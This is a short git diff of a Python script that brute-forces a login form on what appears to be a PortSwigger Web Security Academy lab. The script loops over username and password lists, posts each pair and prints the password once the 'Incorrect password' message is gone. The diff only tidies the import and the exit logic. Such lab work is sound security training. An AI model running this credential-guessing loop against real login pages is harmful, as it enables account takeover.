@@ -1,6 +1,6 @@
 import requests,urllib3
 
-from functions import usernames,passwords
+from credentials import usernames,passwords
 
 # Disable SSL warnings for unverified HTTPS requests
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -13,7 +13,6 @@ proxies = {
 
 url = "https://0a510091044d65f781f4163900ae00f9.web-security-academy.net/login"
 
-found = False
 
 for username in usernames:
     data = {
@@ -37,7 +36,4 @@ for username in usernames:
 
             if "Incorrect password" not in response.text:
                 print("password = ",password)
-                found = True
-                break
-    if found == True:
-        break
+                exit()
